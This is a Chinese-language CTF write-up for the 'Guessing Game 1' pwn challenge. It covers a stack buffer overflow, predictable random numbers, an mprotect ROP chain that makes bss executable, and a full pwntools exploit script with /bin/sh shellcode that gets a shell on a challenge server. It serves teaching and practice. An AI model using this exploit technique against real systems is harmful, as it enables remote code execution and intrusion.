# Guessing Game 1

## 0x01 常规看看

题目给了三个文件，通过makefile可知程序是静态编译

```sh
gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c
```

```sh
[*] '/home/kali/ctf/pwn/q36_guessing_game_1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found 
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
事实上这次checksec有些不准，应没有canary

没开启栈保护

读源码发现存在栈溢出漏洞

```c
#define BUFSIZE 100

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}
```

此外，由于没有设种，随机数是伪随机数，另写一个程序便可知其随机数序列（要用linux编译运行）,这样我们就可以轻松利用这个漏洞了

## 0x02 初步分析

程序中没有 `system()` 函数和 `/bin/sh` 字符串，又是静态编译，无法像之前那样通过libc获取，只能使用shellcode了

但程序中栈不可执行，且无法得知栈的确切位置，只能通过别的方法注入shellcode

想到用shellcode覆盖一段bss段数据，然后将返回地址覆盖到该段执行shellcode。用gdb的 `vmmap` 命令查看，bss段可读可写不可执行，所以要想执行shellcode，就先要把bss段修改为可读可写可执行权限。

这里需要用到 `mprotect()` 函数。

## 0x03 mprotect()

linux中 `mprotect()` 可以用来修改一段指定内存区域的保护属性

函数原型：
```c
#include <unistd.h>   
#include <sys/mmap.h>   
int mprotect(const void *start, size_t len, int prot);
```

参数：

- `start` 修改权限开始地址，必须是一个内存页的起始地址，一页为 `0x1000` 
- `len` 修改长度
- `prot` 权限属性
  - `PROT_READ=4` 可读
  - `PROT_WRITE=2` 可写
  - `PROT_EXEC=1` 可执行
  - `PROT_NONE=0` 没有以上三种权限

返回值：

- `0` success
- `-1` fail, 并且系统调用错误码被覆盖

如果对内存进行不合权限的操作，内核会产生 `Segmentation fault`

这里我们希望bss段可读可写可执行，应将 `prot` 置为 `7` 

## 0x04 Pwn it！

由于是64位程序，传6个以内的参数依次由 `rdi,rsi,rdx,rcx,r8,r9`进行，所以我们首先要找 `gadget` ，即形如 `pop rdi;ret` 的小片段以进行参数传递

```sh
ROPgadget --binary vuln --only "pop|ret" | grep -E "rdi|rsi|rdx"

0x0000000000482776 : pop rax ; pop rdx ; pop rbx ; ret
0x00000000004026f5 : pop rdi ; pop rbp ; ret
0x0000000000400696 : pop rdi ; ret
0x000000000047099d : pop rdi ; ret 0xfffd
0x000000000044cc24 : pop rdx ; pop r10 ; ret
0x0000000000482777 : pop rdx ; pop rbx ; ret
0x000000000044cc49 : pop rdx ; pop rsi ; ret
0x000000000044cc26 : pop rdx ; ret
0x00000000004026f3 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000400694 : pop rsi ; pop r15 ; ret
0x000000000041025e : pop rsi ; pop rbp ; ret
0x0000000000410ca3 : pop rsi ; ret
```

于是可以在处理好随机数后构造 `payload1` ，给bss段提权

```py
rdi_addr=0x0000000000400696
rsi_addr=0x0000000000410ca3
rdx_addr=0x000000000044cc26
payload1=b'a'*120+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(buf_size)+p64(rdx_addr)+p64(buf_prot)+p64(mprotect_addr)+p64(main_addr)
```

接着在下一轮中用 `read` 读入shellcode

```py
payload2=b'a'*120+p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(shellcode_addr)+p64(rdx_addr)+p64(29)+p64(read_addr)+p64(main_addr)
```

最后再执行shellcode

```py
payload3=b'a'*120+p64(shellcode_addr)
```

## 0x05 exp

```py
from pwn import *
ip="124.16.75.117"
port=51001
conn=connect(ip,port)
#conn=process("./pwn/q36_guessing_game_1/vuln")
context.log_level="debug"
bss_addr=0x00000000006BC000
mprotect_addr=0x000000000044B480
buf_size=0x1000
buf_prot=0x7
rdi_addr=0x0000000000400696
rsi_addr=0x0000000000410ca3
rdx_addr=0x000000000044cc26
return_addr=0x0000000000400CEE
main_addr=0x0000000000400C8C
write_addr=0x000000000044A770
read_addr=0x000000000044A6A0
shellcode_addr=0x00000000006BC554
shellcode=b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

print(conn.recvuntil(b"What number would you like to guess?\n"))
conn.sendline(b'84')

print(conn.recvuntil(b'!\nName?'))
payload1=b'a'*120+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(buf_size)+p64(rdx_addr)+p64(buf_prot)+p64(mprotect_addr)+p64(main_addr)
conn.sendline(payload1)



print(conn.recvuntil(b"What number would you like to guess?\n"))
conn.sendline(b'87')
print(conn.recvuntil(b'!\nName?'))
payload2=b'a'*120+p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(shellcode_addr)+p64(rdx_addr)+p64(29)+p64(read_addr)+p64(main_addr)
conn.sendline(payload2)
conn.send(shellcode)


print(conn.recvuntil(b"What number would you like to guess?\n"))
conn.sendline(b'78')
print(conn.recvuntil(b'!\nName?'))
payload3=b'a'*120+p64(shellcode_addr)
conn.sendline(payload3)
conn.interactive()

```

## 0x06 其他的做法

[Guessing Game 1 | 7Rocky](https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/)
